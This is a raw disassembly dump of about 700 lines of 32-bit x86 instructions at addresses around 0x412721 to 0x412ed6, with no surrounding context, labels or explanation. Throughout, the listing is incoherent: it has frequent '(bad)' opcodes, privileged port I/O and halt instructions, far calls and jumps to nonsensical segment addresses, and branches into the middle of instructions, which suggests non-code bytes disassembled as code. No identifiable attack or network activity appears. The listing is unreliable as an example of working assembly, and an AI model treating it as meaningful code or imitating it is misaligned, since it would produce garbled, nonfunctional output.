  412721:	push   edi
  412722:	and    DWORD PTR ds:0x865138b2,eax
  412728:	push   ds
  412729:	hlt    
  41272a:	mov    ebx,0x355428d2
  41272f:	pop    edx
  412730:	dec    ecx
  412731:	rcl    BYTE PTR [edx],1
  412733:	jp     0x412704
  412735:	mov    edi,ebp
  412737:	je     0x412705
  412739:	dec    edx
  41273a:	dec    ebx
  41273b:	test   BYTE PTR [eax+edi*2+0x57],al
  41273f:	cmc    
  412740:	gs repz dec eax
  412743:	jae    0x41270d
  412745:	jbe    0x412702
  412747:	lock xor cl,0x67
  41274b:	fcomp  QWORD PTR [eax]
  41274d:	out    0x91,eax
  41274f:	fdiv   st(6),st
  412751:	and    bl,ah
  412753:	inc    ebx
  412754:	xor    dl,BYTE PTR [ebp-0x362c1b64]
  41275a:	stos   BYTE PTR es:[edi],al
  41275b:	xor    al,0x6
  41275d:	fiadd  WORD PTR [edi-0x60988cd6]
  412763:	ins    BYTE PTR es:[edi],dx
  412764:	jl     0x1fa16ccd
  41276a:	ss jne 0x4127a2
  41276d:	dec    edx
  41276e:	call   0x7c82:0xe9e0297
  412775:	adc    ah,cl
  412777:	adc    ch,ch
  412779:	xor    BYTE PTR [ebx-0x29d77df],dl
  41277f:	adc    al,BYTE PTR [esi]
  412781:	cmp    esp,ebx
  412783:	lock jns 0x412761
  412786:	nop
  412787:	mov    eax,ds:0xd7b8301f
  41278c:	call   0x614f4327
  412791:	xor    al,0x70
  412793:	lea    esi,ds:0x63faab72
  412799:	or     bh,ah
  41279b:	bound  esi,QWORD PTR [eax-0x59a12bcb]
  4127a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127a2:	sbb    ah,BYTE PTR [ecx]
  4127a4:	stos   DWORD PTR es:[edi],eax
  4127a5:	jno    0x4127d4
  4127a7:	push   ebp
  4127a8:	cmp    edx,DWORD PTR [ebx]
  4127aa:	fwait
  4127ab:	mov    al,0x9c
  4127ad:	out    0xe8,al
  4127af:	add    DWORD PTR [esi+0x25],esi
  4127b2:	mov    ds:0xe85ffad,al
  4127b7:	lea    edx,[esi]
  4127b9:	or     DWORD PTR [ebp+0x456a2e6e],ebp
  4127bf:	pusha  
  4127c0:	js     0x412793
  4127c2:	shl    BYTE PTR [edx-0x17],0x1a
  4127c6:	fsubr  DWORD PTR ds:0x175380
  4127cc:	dec    ebp
  4127cd:	or     BYTE PTR [ebx+0x7bd538d4],dh
  4127d3:	data16 lods al,BYTE PTR ds:[esi]
  4127d5:	xor    DWORD PTR [ebx+0x3a1ec9b7],ebp
  4127db:	fnsave [esi-0x4e]
  4127de:	xchg   edx,eax
  4127df:	inc    ecx
  4127e0:	loop   0x412819
  4127e2:	sub    DWORD PTR [eax],edi
  4127e4:	sub    cl,BYTE PTR [esi+ebp*1+0x42]
  4127e8:	pushf  
  4127e9:	jl     0x4127a8
  4127eb:	push   edx
  4127ec:	pop    esp
  4127ed:	imul   BYTE PTR [edx]
  4127ef:	gs dec edi
  4127f1:	inc    eax
  4127f2:	leave  
  4127f3:	jg     0x41278c
  4127f5:	fmul   DWORD PTR [edi-0x2c5908df]
  4127fb:	popf   
  4127fc:	pop    ebx
  4127fd:	push   eax
  4127fe:	fistp  QWORD PTR [eax]
  412800:	mov    ah,0x7c
  412802:	clc    
  412803:	dec    eax
  412804:	mov    eax,ds:0x13b0814
  412809:	(bad)  
  41280a:	pop    edx
  41280b:	daa    
  41280c:	inc    ebp
  41280d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41280e:	dec    esi
  41280f:	sbb    DWORD PTR [esi-0x25],0xa6fcd239
  412816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412817:	cld    
  412818:	and    al,0x46
  41281a:	push   es
  41281b:	cwde   
  41281c:	sbb    eax,0x3a5f5efb
  412821:	clc    
  412822:	push   eax
  412823:	adc    DWORD PTR [edx],eax
  412825:	add    dl,bl
  412827:	test   eax,0xcdff05d7
  41282c:	mov    dh,0xdd
  41282e:	mov    BYTE PTR [edx+esi*1+0x31],cl
  412832:	aam    0x29
  412834:	push   cs
  412835:	mov    esi,0x3c80dd2e
  41283a:	jbe    0x4127c1
  41283c:	in     eax,0xfe
  41283e:	nop
  41283f:	mov    dh,0x3e
  412841:	dec    ebp
  412842:	cmp    edi,DWORD PTR [eax-0x17]
  412845:	mov    BYTE PTR [edi-0x7b84d428],al
  41284b:	(bad)  
  41284c:	mov    ch,0x81
  41284e:	nop
  41284f:	cmp    DWORD PTR [ebp+0x39c53b4a],edx
  412855:	adc    DWORD PTR [ebx],esp
  412857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412858:	jbe    0x4128cd
  41285a:	or     BYTE PTR [eiz*1+0xbe656bf],cl
  412861:	fnstenv [ebp+0x4c]
  412864:	dec    edi
  412865:	mov    ebp,0xc3c1402d
  41286a:	fld    TBYTE PTR [bx+di+0x36]
  41286e:	mov    ch,0x4d
  412870:	jnp    0x41289f
  412872:	fst    QWORD PTR [edx+0x58]
  412875:	sbb    DWORD PTR [edx+0x2ba1f8ba],ebp
  41287b:	mov    edi,0xdf3d6b29
  412880:	ss shl al,1
  412883:	int3   
  412884:	inc    edx
  412885:	sbb    al,0x34
  412887:	in     al,0xca
  412889:	and    DWORD PTR [esi+0x54],ecx
  41288c:	rcr    DWORD PTR [edx+0x38],1
  41288f:	push   es
  412890:	adc    al,0x92
  412892:	sar    DWORD PTR [ebx],1
  412894:	mov    ah,0x18
  412896:	and    al,0x9
  412898:	je     0x41284c
  41289a:	mov    ds:0x6f441b03,eax
  41289f:	cmp    al,0x18
  4128a1:	js     0x41285b
  4128a3:	cli    
  4128a4:	jbe    0x412919
  4128a6:	mov    WORD PTR [ebx+0x7a],cs
  4128a9:	cwde   
  4128aa:	sbb    BYTE PTR [ebx],dl
  4128ac:	cmc    
  4128ad:	shr    DWORD PTR [eax],0x8d
  4128b0:	jg     0x41288a
  4128b2:	sub    bl,BYTE PTR [edi]
  4128b4:	sahf   
  4128b5:	bound  ebx,QWORD PTR [edx]
  4128b7:	pop    edx
  4128b8:	test   al,0x85
  4128ba:	inc    edx
  4128bb:	out    0xd4,eax
  4128bd:	sub    bh,BYTE PTR ds:0x29b2ea36
  4128c3:	sti    
  4128c4:	or     DWORD PTR [eax],ebp
  4128c6:	sub    BYTE PTR [eax-0x55],ch
  4128c9:	fcomp  QWORD PTR [edi-0x28]
  4128cc:	stos   DWORD PTR es:[edi],eax
  4128cd:	clc    
  4128ce:	dec    edx
  4128cf:	sbb    ebx,esi
  4128d1:	retf   0xd943
  4128d4:	call   0xbbcb:0x96f6844c
  4128db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128dc:	or     edx,DWORD PTR [esi+0x7a18008e]
  4128e2:	stos   DWORD PTR es:[edi],eax
  4128e3:	add    esi,esi
  4128e5:	cmp    BYTE PTR [ecx+0x211060e0],0x5f
  4128ec:	cmovg  esi,ebx
  4128ef:	dec    edi
  4128f0:	xor    ebx,DWORD PTR [ebx-0x4e90b5b0]
  4128f6:	gs aam 0xdb
  4128f9:	mov    cs,WORD PTR [ebp-0x30]
  4128fc:	leave  
  4128fd:	xchg   esp,eax
  4128fe:	ret    
  4128ff:	retf   0x8c37
  412902:	add    esi,eax
  412904:	daa    
  412905:	ret    0x1ca0
  412908:	in     eax,dx
  412909:	and    BYTE PTR [ebp-0x14],dh
  41290c:	xor    edx,DWORD PTR [esi]
  41290e:	pop    ss
  41290f:	(bad)  
  412910:	imul   BYTE PTR [edx+0x415bb572]
  412916:	jl     0x4128c6
  412918:	push   edx
  412919:	sub    eax,0xa398eb5f
  41291f:	aam    0x8c
  412921:	mov    ds:0x4e6a3a79,al
  412926:	pop    edx
  412927:	test   DWORD PTR [eax+ebx*8+0x69],edx
  41292b:	xchg   BYTE PTR [edx],dl
  41292d:	std    
  41292e:	adc    BYTE PTR [eax+ebx*1+0x13],0xf0
  412933:	test   al,0x18
  412935:	sbb    bh,al
  412937:	or     eax,0xde4faa4d
  41293c:	scas   eax,DWORD PTR es:[edi]
  41293d:	pop    ss
  41293e:	jae    0x41290b
  412940:	xchg   edx,eax
  412941:	push   ecx
  412942:	push   ecx
  412943:	cmp    edi,0x6c
  412946:	xchg   BYTE PTR ds:0x4214626d,al
  41294c:	mov    edi,0xba0350f
  412951:	sub    DWORD PTR [eax+0x6673e0d9],ecx
  412957:	xchg   ecx,eax
  412958:	xlat   BYTE PTR ds:[ebx]
  412959:	or     eax,0xa77510e2
  41295e:	mov    WORD PTR [edi],?
  412960:	mov    esi,0x29bedb6c
  412965:	push   0x4d
  412967:	mov    esp,0xa5051057
  41296c:	aam    0x45
  41296e:	add    DWORD PTR [ebp+0xb],0x7166de9c
  412975:	or     eax,0x251cb632
  41297a:	cwde   
  41297b:	xor    DWORD PTR ds:0x6b390431,edi
  412981:	jmp    FWORD PTR [ebx-0x3358c6ce]
  412987:	sahf   
  412988:	push   edi
  412989:	inc    edx
  41298a:	stos   BYTE PTR es:[edi],al
  41298b:	cmp    eax,0xbfee0229
  412990:	add    eax,0xa6434c5a
  412995:	adc    BYTE PTR fs:[esp+eax*8+0x692c0cec],dl
  41299d:	rcl    BYTE PTR ds:0x13994118,1
  4129a3:	cmp    esi,esp
  4129a5:	(bad)  
  4129a6:	into   
  4129a7:	mov    esp,0x165e59ce
  4129ac:	fs test eax,0x891f2383
  4129b2:	scas   al,BYTE PTR es:[edi]
  4129b3:	in     eax,0xca
  4129b5:	xchg   ecx,eax
  4129b6:	dec    ebp
  4129b7:	sahf   
  4129b8:	add    eax,0x27291e41
  4129bd:	pop    ds
  4129be:	push   edx
  4129bf:	call   0xe6890a19
  4129c4:	mov    ds:0x38689fcb,eax
  4129c9:	addr16 xabort 0xd5
  4129cd:	pop    edi
  4129ce:	mov    ch,0x14
  4129d0:	xor    DWORD PTR [esi],ecx
  4129d2:	enter  0x558a,0x55
  4129d6:	(bad)  
  4129d8:	sub    ecx,esp
  4129da:	mov    cl,0x80
  4129dc:	jns    0x4129b1
  4129de:	mov    eax,0x5a68e804
  4129e3:	and    al,0x15
  4129e5:	in     eax,dx
  4129e6:	lods   eax,DWORD PTR ds:[esi]
  4129e7:	cmp    DWORD PTR [edi+0x31],ebp
  4129ea:	not    DWORD PTR [esi]
  4129ec:	cmp    eax,0x863a75d
  4129f1:	xor    edi,DWORD PTR [esp+ecx*8+0x56]
  4129f5:	jl     0x412a62
  4129f7:	dec    ebx
  4129f8:	aad    0x2a
  4129fa:	adc    BYTE PTR [esi-0x2e2bde9e],bl
  412a00:	mov    ds:0xce437756,eax
  412a05:	fdivr  QWORD PTR [ecx+0x32a8511a]
  412a0b:	pop    esp
  412a0c:	xor    al,0x9f
  412a0e:	lods   eax,DWORD PTR ds:[esi]
  412a0f:	dec    ebx
  412a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a11:	sub    al,dh
  412a13:	ret    
  412a14:	add    eax,0x50a42e99
  412a19:	xor    eax,0x911b3dd9
  412a1e:	call   0xa0935021
  412a23:	test   BYTE PTR [ebx+ebx*2+0x1c],dl
  412a27:	(bad)  
  412a28:	nop
  412a29:	sub    esp,DWORD PTR ds:0x8f1427bb
  412a2f:	jbe    0x412a1f
  412a31:	clc    
  412a32:	push   ebp
  412a33:	cmp    BYTE PTR [esi+0x2cf6fed2],dl
  412a39:	sar    DWORD PTR [edx+edi*8+0xa9472a9],1
  412a40:	push   ebp
  412a41:	mov    dl,0x80
  412a43:	out    dx,eax
  412a44:	not    DWORD PTR [ebx-0x58]
  412a47:	test   BYTE PTR [ebp-0x15],ah
  412a4a:	add    DWORD PTR [eax],ebp
  412a4c:	loopne 0x412a07
  412a4e:	sbb    BYTE PTR [ecx],ch
  412a50:	cdq    
  412a51:	add    al,0xe4
  412a53:	xchg   ebp,eax
  412a54:	inc    eax
  412a55:	loope  0x412ac3
  412a57:	mov    ds:0xeb9bf9af,al
  412a5c:	adc    ebx,ebx
  412a5e:	pop    ecx
  412a5f:	call   eax
  412a61:	popa   
  412a62:	cmp    eax,0xa8e12125
  412a67:	dec    eax
  412a68:	call   0xe653d1da
  412a6d:	mov    cl,BYTE PTR [ecx]
  412a6f:	in     eax,dx
  412a70:	retf   0x49b8
  412a73:	xchg   edi,eax
  412a74:	das    
  412a75:	out    dx,eax
  412a76:	ret    0xebe2
  412a79:	fdiv   DWORD PTR [eax]
  412a7b:	mov    al,ds:0xf6b8d842
  412a80:	jecxz  0x412a4e
  412a82:	(bad)  
  412a83:	stc    
  412a84:	and    ecx,DWORD PTR [ebx+0x6a]
  412a87:	mov    ebp,0x1ac47f3b
  412a8c:	xchg   esi,eax
  412a8d:	pop    esi
  412a8e:	aad    0xd2
  412a90:	dec    ebx
  412a91:	lea    ebx,[edx]
  412a93:	data16 movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  412a96:	repz pop eax
  412a98:	data16 in al,dx
  412a9a:	xchg   ebp,eax
  412a9b:	inc    ecx
  412a9c:	mov    gs,WORD PTR [esi+0x43]
  412a9f:	xchg   ecx,eax
  412aa0:	lahf   
  412aa1:	sar    BYTE PTR [esp+esi*4-0x2d],1
  412aa5:	mov    DWORD PTR [ebp+0x11],eax
  412aa8:	cmp    BYTE PTR [eiz*1-0x7c5e2bba],ah
  412aaf:	add    al,0x29
  412ab1:	mov    eax,ds:0x2889c2d3
  412ab6:	adc    al,0x2a
  412ab8:	cmp    eax,0xa9d27aca
  412abd:	cmovp  ebp,DWORD PTR [esi]
  412ac0:	enter  0x2a53,0x53
  412ac4:	mov    ebp,0x544c33a5
  412ac9:	sbb    esp,eax
  412acb:	and    eax,0xf063a24d
  412ad0:	inc    edi
  412ad1:	(bad)  
  412ad2:	scas   al,BYTE PTR es:[edi]
  412ad3:	imul   ebx,DWORD PTR [ebx-0x47604a1],0xa5bda41b
  412add:	and    eax,0xf817eecf
  412ae2:	mov    esi,0xec36f690
  412ae7:	sbb    edi,0xffffffbd
  412aea:	mov    eax,ds:0x326a40a9
  412aef:	sub    DWORD PTR [edx-0x80],ebp
  412af2:	sbb    eax,0x5a6f9461
  412af7:	dec    ebp
  412af8:	fs hlt 
  412afa:	lahf   
  412afb:	dec    esi
  412afc:	mov    ch,0x99
  412afe:	inc    ecx
  412aff:	jae    0x412ad0
  412b01:	add    ah,BYTE PTR [edx+0x1aa8de17]
  412b07:	dec    eax
  412b08:	popa   
  412b09:	ffreep st(4)
  412b0b:	pop    ebp
  412b0c:	jmp    0x412b2a
  412b0e:	jo     0x412afa
  412b10:	(bad)  
  412b12:	dec    ebx
  412b13:	fs push ebp
  412b15:	add    eax,0x18086e8c
  412b1a:	(bad)  
  412b1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b1c:	pop    ebp
  412b1d:	xchg   ebx,eax
  412b1e:	or     BYTE PTR ds:0xffcce0b8,ch
  412b24:	mov    WORD PTR [ecx-0x4d],es
  412b27:	out    dx,eax
  412b28:	retf   0x3256
  412b2b:	in     eax,dx
  412b2c:	(bad)  
  412b2d:	in     eax,0x0
  412b2f:	sub    ch,BYTE PTR [edx]
  412b31:	and    BYTE PTR ds:0xd4a8ec57,dh
  412b37:	daa    
  412b38:	mov    bl,0x2e
  412b3a:	mov    dh,0x28
  412b3c:	sti    
  412b3d:	sbb    ah,BYTE PTR [ecx-0x7161c6d9]
  412b43:	pop    edx
  412b44:	mov    eax,0xc5464f19
  412b49:	pop    ebp
  412b4a:	xchg   ecx,eax
  412b4b:	or     esi,DWORD PTR [edx+edi*8-0x14]
  412b4f:	in     eax,dx
  412b50:	add    DWORD PTR [edx+0x65],esp
  412b53:	sbb    ebp,DWORD PTR [ebp-0x1c7724c3]
  412b59:	push   edi
  412b5a:	lock push edx
  412b5c:	push   0xf8b82f8
  412b61:	adc    dh,dl
  412b63:	loop   0x412b9e
  412b65:	sub    bh,bh
  412b67:	xor    BYTE PTR [ecx],bl
  412b69:	xchg   edi,eax
  412b6a:	push   esp
  412b6b:	adc    DWORD PTR [edi+0x5640ef34],ebp
  412b71:	xchg   ebx,eax
  412b72:	fidivr WORD PTR [edx+ecx*4]
  412b75:	lahf   
  412b76:	xlat   BYTE PTR ds:[ebx]
  412b77:	out    dx,al
  412b78:	xchg   esp,eax
  412b79:	and    DWORD PTR [ebx-0x18],0xa1927c39
  412b80:	cmp    ebx,DWORD PTR [edi]
  412b82:	pop    edx
  412b83:	test   al,0xe2
  412b85:	call   0x8c7:0x4279fbf3
  412b8c:	mov    al,0x87
  412b8e:	cwde   
  412b8f:	xor    ebp,DWORD PTR [edx+eax*1]
  412b92:	cmp    ah,BYTE PTR [esi-0x22]
  412b95:	(bad)  
  412b96:	mov    ecx,0xae0ef9f8
  412b9b:	inc    ebx
  412b9c:	in     eax,dx
  412b9d:	mov    esp,0x8a6df271
  412ba2:	fisub  WORD PTR [edi+eiz*1-0x54]
  412ba6:	add    BYTE PTR [eax],cl
  412ba8:	push   ebp
  412ba9:	aad    0x1
  412bab:	push   eax
  412bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bad:	sub    al,0xee
  412baf:	scas   al,BYTE PTR es:[edi]
  412bb0:	ffreep st(0)
  412bb2:	sbb    BYTE PTR [eax+0x40748581],bl
  412bb8:	push   ss
  412bb9:	rcl    DWORD PTR [ebx-0x6bfdbf9e],1
  412bbf:	shl    BYTE PTR [ebx],1
  412bc1:	test   BYTE PTR [ebx+0x74369040],dh
  412bc7:	in     eax,0x73
  412bc9:	dec    edi
  412bca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bcb:	sbb    eax,0x37c6824a
  412bd0:	cmc    
  412bd1:	cmp    al,BYTE PTR [esi+0x237ed432]
  412bd7:	inc    ebx
  412bd8:	in     al,0xb0
  412bda:	test   BYTE PTR [eax+0x1f],cl
  412bdd:	mov    bl,0xae
  412bdf:	loope  0x412be7
  412be1:	std    
  412be2:	scas   eax,DWORD PTR es:[edi]
  412be3:	and    al,0xf0
  412be5:	add    al,0xec
  412be7:	imul   edi,esi,0x4f
  412bea:	push   esp
  412beb:	outs   dx,DWORD PTR ds:[esi]
  412bec:	cdq    
  412bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bee:	adc    al,0x58
  412bf0:	jge    0x412baa
  412bf2:	pop    edi
  412bf3:	xor    DWORD PTR [ecx+0x64f5ec4a],0x5bf45d09
  412bfd:	cmp    eax,ecx
  412bff:	or     DWORD PTR [ecx-0x6ab56f80],edx
  412c05:	ds push ebx
  412c07:	test   al,0xfe
  412c09:	fadd   DWORD PTR [ebp*4+0x52fca5ae]
  412c10:	stos   DWORD PTR es:[edi],eax
  412c11:	ret    
  412c12:	jmp    0x412c3a
  412c14:	jle    0x412c47
  412c16:	cwde   
  412c17:	mov    ecx,0x6996c2f7
  412c1c:	cli    
  412c1d:	push   eax
  412c1e:	lods   al,BYTE PTR ds:[esi]
  412c1f:	mov    ch,0x41
  412c21:	xchg   esi,eax
  412c22:	adc    BYTE PTR [ebx],ah
  412c24:	inc    esi
  412c25:	mov    bh,0x5a
  412c27:	ins    DWORD PTR es:[edi],dx
  412c28:	push   0x1f
  412c2a:	mov    ds:0xf4c23f3f,al
  412c2f:	repnz in eax,dx
  412c31:	ds sahf 
  412c33:	loopne 0x412c3d
  412c35:	(bad)
  412c3a:	inc    edi
  412c3b:	push   eax
  412c3c:	mov    edx,0x2f968b36
  412c41:	imul   esi,DWORD PTR [edx-0x6e3135fd],0x45
  412c48:	sbb    BYTE PTR [esi],al
  412c4a:	adc    edx,DWORD PTR [edx-0x3e]
  412c4d:	fbld   TBYTE PTR [eax+ebx*4]
  412c50:	fsubr  st(0),st
  412c52:	xlat   BYTE PTR ds:[ebx]
  412c53:	or     eax,0xcfe4701b
  412c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c59:	data16 mov bl,0x3a
  412c5c:	mov    WORD PTR [edx-0x30e96b71],bp
  412c63:	addr16 fwait
  412c65:	idiv   dl
  412c67:	js     0x412ccb
  412c69:	mov    ds:0x1f095c9a,eax
  412c6e:	arpl   WORD PTR [ebp-0x64a59430],si
  412c74:	mov    bh,0xa9
  412c76:	xor    BYTE PTR [eax+eiz*1-0x29ec2f93],dh
  412c7d:	js     0x412c8d
  412c7f:	xchg   esp,eax
  412c80:	jle    0x412cb9
  412c82:	xor    ch,BYTE PTR [eax]
  412c84:	xor    ch,BYTE PTR [ebp-0x94640ac]
  412c8a:	xor    eax,DWORD PTR [eax+0x1cd3c7a7]
  412c90:	test   dh,0x4
  412c93:	dec    ecx
  412c94:	(bad)  
  412c95:	sahf   
  412c96:	sbb    al,0x4d
  412c98:	adc    DWORD PTR [esi],edi
  412c9a:	jb     0x412c3e
  412c9c:	cld    
  412c9d:	xor    DWORD PTR [ecx-0x3c],esp
  412ca0:	push   ds
  412ca1:	cmp    eax,0xc7673c1d
  412ca6:	dec    esp
  412ca7:	jb     0x412d0a
  412ca9:	repz rol esi,cl
  412cac:	sub    al,0x5d
  412cae:	adc    bh,dl
  412cb0:	or     ecx,esi
  412cb2:	xchg   ecx,eax
  412cb3:	xor    esp,DWORD PTR fs:[ebx+0x3c]
  412cb7:	or     ecx,ecx
  412cb9:	js     0x412ccd
  412cbb:	or     BYTE PTR [edi-0x5dcb4149],al
  412cc1:	xchg   ebx,eax
  412cc2:	xchg   DWORD PTR [ebp-0x34],eax
  412cc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cc6:	(bad)  
  412cc7:	aam    0x69
  412cc9:	pop    edx
  412cca:	pop    edx
  412ccb:	jo     0x412c84
  412ccd:	cli    
  412cce:	jmp    0x9aec:0xcddff2e5
  412cd5:	push   ebx
  412cd6:	jno    0x412ca6
  412cd8:	aad    0x5f
  412cda:	add    DWORD PTR [edi],ebp
  412cdc:	out    0x8b,al
  412cde:	dec    edx
  412cdf:	retf   
  412ce0:	xchg   edx,eax
  412ce1:	dec    esp
  412ce2:	pop    edi
  412ce3:	mov    eax,ds:0xd5b3d336
  412ce8:	fdivr  DWORD PTR [edx-0x178ea09f]
  412cee:	add    BYTE PTR [ecx-0x509c3abd],bl
  412cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cf5:	mov    ebx,0xec7b5531
  412cfa:	ror    BYTE PTR [esi+ecx*8],1
  412cfd:	jle    0x412cef
  412cff:	outs   dx,DWORD PTR ds:[esi]
  412d00:	enter  0x7d01,0x77
  412d04:	aaa    
  412d05:	add    BYTE PTR [edx-0x2d8cfb66],dh
  412d0b:	jle    0x412d3b
  412d0d:	push   ds
  412d0e:	xchg   edx,eax
  412d0f:	mov    cs,WORD PTR cs:[esi-0x444f2fa2]
  412d16:	cmp    BYTE PTR [edx-0x30a99189],bh
  412d1c:	daa    
  412d1d:	icebp  
  412d1e:	dec    edi
  412d1f:	ins    BYTE PTR es:[edi],dx
  412d20:	addr16 mov bh,0x89
  412d23:	mov    al,ds:0xc4ada303
  412d28:	mov    esi,?
  412d2a:	test   DWORD PTR ds:0xf723f463,esi
  412d30:	mov    fs,edx
  412d32:	mov    dl,0xae
  412d34:	pop    edi
  412d35:	jnp    0x412dab
  412d37:	pop    eax
  412d38:	data16 hlt 
  412d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d3b:	(bad)  
  412d3c:	(bad)  
  412d3d:	lock dec ecx
  412d3f:	repnz outs dx,BYTE PTR fs:[esi]
  412d42:	out    dx,al
  412d43:	push   edx
  412d44:	or     DWORD PTR [edi-0x62],0x618d5a42
  412d4b:	loop   0x412d6b
  412d4d:	xor    DWORD PTR [edi-0x79],esi
  412d50:	mov    dl,0x76
  412d52:	inc    esi
  412d53:	xor    eax,DWORD PTR [edx]
  412d55:	stos   BYTE PTR es:[edi],al
  412d56:	data16 out 0xdb,al
  412d59:	jl     0x412dad
  412d5b:	lea    esi,[edx-0x33]
  412d5e:	je     0x412ce5
  412d60:	in     al,dx
  412d61:	inc    ah
  412d63:	jl     0x412cf2
  412d65:	ja     0x412d45
  412d67:	stos   BYTE PTR es:[edi],al
  412d68:	js     0x412d1e
  412d6a:	aad    0xdc
  412d6c:	xchg   esi,eax
  412d6d:	lock mov ch,0x99
  412d70:	xor    edx,DWORD PTR [eax-0x49]
  412d73:	and    al,0x5d
  412d75:	(bad)  
  412d77:	out    0x88,al
  412d79:	lahf   
  412d7a:	push   ecx
  412d7b:	xchg   edi,eax
  412d7c:	jmp    0x412dd2
  412d7e:	test   eax,0x56c56e2d
  412d83:	ja     0x412df3
  412d85:	out    dx,eax
  412d86:	sub    dh,BYTE PTR [eax+0x42e3dc9b]
  412d8c:	dec    eax
  412d8d:	pop    ds
  412d8e:	push   0x7c
  412d90:	mov    dl,0x6c
  412d92:	push   edx
  412d93:	adc    al,0x24
  412d95:	adc    DWORD PTR [eax+0x3af37de],ecx
  412d9b:	(bad)  
  412d9c:	out    dx,eax
  412d9d:	stos   DWORD PTR es:[edi],eax
  412d9e:	(bad)  [ebp-0x45039966]
  412da4:	or     BYTE PTR [ebp-0x54ab7e3b],bl
  412daa:	jg     0x412d86
  412dac:	add    BYTE PTR ds:0x2c08ab39,cl
  412db2:	clc    
  412db3:	push   ebp
  412db4:	je     0x412d9a
  412db6:	mov    ds:0x7a043b5c,eax
  412dbb:	jmp    DWORD PTR [ecx]
  412dbd:	jno    0x412d4a
  412dbf:	pop    eax
  412dc0:	pop    es
  412dc1:	call   0xdf3b:0xf42b1367
  412dc8:	fst    QWORD PTR [edx+0x7e]
  412dcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dcc:	retf   0x3da8
  412dcf:	(bad)  
  412dd0:	sti    
  412dd1:	pop    esi
  412dd2:	inc    ebp
  412dd3:	sti    
  412dd4:	inc    esp
  412dd5:	(bad)  
  412dd7:	jo     0x412e3a
  412dd9:	jmp    0x87d2c059
  412dde:	jmp    0x1638:0x6b1736db
  412de5:	aad    0xa2
  412de7:	jns    0x412e19
  412de9:	mov    ah,0xed
  412deb:	mov    ds:0x23095dff,eax
  412df0:	inc    esi
  412df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412df2:	(bad)
  412df5:	arpl   cx,si
  412df7:	dec    ebp
  412df8:	xor    eax,DWORD PTR [esp+edx*2+0x4106767d]
  412dff:	call   0xf6689a8b
  412e04:	mov    ds:0xacc81679,al
  412e09:	es iret 
  412e0b:	add    al,0x68
  412e0d:	call   0xe99e698
  412e12:	inc    ebx
  412e13:	and    al,0x1
  412e15:	mov    ss,ebp
  412e17:	loopne 0x412e6b
  412e19:	addr16 retf 0x3127
  412e1d:	and    al,0x55
  412e1f:	xor    eax,0x4b87a636
  412e24:	out    dx,eax
  412e25:	mov    ebp,0x6dfb5b42
  412e2a:	add    DWORD PTR [edx+eiz*1-0x1cd4c834],edi
  412e31:	les    edx,FWORD PTR [ebp+0x718b8c51]
  412e37:	mov    ah,0x1c
  412e39:	ins    BYTE PTR es:[edi],dx
  412e3a:	outs   dx,DWORD PTR ds:[esi]
  412e3b:	lods   eax,DWORD PTR ds:[esi]
  412e3c:	mov    esi,0x61f1fcdf
  412e41:	stos   BYTE PTR es:[edi],al
  412e42:	or     BYTE PTR [edi+0x6b],dl
  412e45:	test   BYTE PTR [esi-0x7dd9abf9],0x59
  412e4c:	mov    ebx,DWORD PTR [ecx-0x145b8e5f]
  412e52:	mov    al,0x77
  412e54:	das    
  412e55:	out    0xac,al
  412e57:	push   cs
  412e58:	jne    0x412e12
  412e5a:	jne    0x412e97
  412e5c:	sbb    BYTE PTR [edi+0xb],bl
  412e5f:	push   0xffffffc3
  412e61:	push   ebx
  412e62:	adc    al,0xdc
  412e64:	ins    BYTE PTR es:[edi],dx
  412e65:	stos   BYTE PTR es:[edi],al
  412e66:	pop    es
  412e67:	dec    edx
  412e68:	pop    eax
  412e69:	outs   dx,BYTE PTR ds:[esi]
  412e6a:	jmp    0x87622d4
  412e6f:	sbb    cl,BYTE PTR [edi]
  412e71:	daa    
  412e72:	ins    BYTE PTR es:[edi],dx
  412e73:	(bad)  
  412e74:	dec    edi
  412e75:	sahf   
  412e76:	jae    0x412e86
  412e78:	popa   
  412e79:	mov    ebp,0x5077caab
  412e7e:	clc    
  412e7f:	add    BYTE PTR [esi-0x3f],bl
  412e82:	mov    cl,0xba
  412e84:	aad    0xeb
  412e86:	mov    ss:0xa74ccde0,al
  412e8c:	inc    edi
  412e8d:	and    ch,BYTE PTR [eax-0x7c]
  412e90:	dec    ebx
  412e91:	pop    esp
  412e92:	out    0x9,al
  412e94:	and    DWORD PTR [edi+0x8e4095a],ebp
  412e9a:	int3   
  412e9b:	sti    
  412e9c:	jne    0x412e5c
  412e9e:	into   
  412e9f:	mov    ds,WORD PTR [ecx+0x1e]
  412ea2:	xchg   edi,eax
  412ea3:	enter  0x1f09,0x57
  412ea7:	xchg   DWORD PTR [edi-0x5556160],edx
  412ead:	stc    
  412eae:	xchg   esi,eax
  412eaf:	out    0x13,al
  412eb1:	inc    ebx
  412eb2:	dec    esp
  412eb3:	psubusw mm0,QWORD PTR [ebp-0x27]
  412eb7:	into   
  412eb8:	imul   edi,ecx,0xb4819a10
  412ebe:	(bad)  
  412ebf:	sbb    eax,0x311ee232
  412ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ec5:	(bad)  
  412ec6:	out    dx,eax
  412ec7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec8:	fdiv   DWORD PTR [edx+0x7f10e345]
  412ece:	test   edi,esi
  412ed0:	sub    edi,DWORD PTR [eax-0x3f]
  412ed3:	xchg   ecx,eax
  412ed4:	jae    0x412f00
  412ed6:	ret    0xc49e
